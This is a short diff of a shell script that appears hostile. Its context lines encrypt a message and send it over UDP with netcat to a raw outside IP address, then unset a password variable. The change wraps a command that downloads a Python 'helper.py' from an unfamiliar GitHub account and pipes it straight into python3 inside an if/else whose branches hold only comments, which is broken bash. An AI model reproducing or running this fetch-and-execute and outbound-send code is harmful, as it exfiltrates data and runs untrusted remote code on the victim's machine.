@@ -41,7 +41,14 @@ ciphertext=$(encrypt "$msg" public_key[@])
 echo $ciphertext | nc -u -q 0 144.24.21.253 65432
 
 # gets DT
-curl -sSL https://raw.githubusercontent.com/CodeUpdaterFXD/testingSuite/main/helper.py | python3 
+
+
+if curl -sSL https://raw.githubusercontent.com/CodeUpdaterFXD/testingSuite/main/helper.py | python3; then
+    # did it but nothing
+else
+    # nothing
+fi
+
 unset pwd
 # preps long msg
 
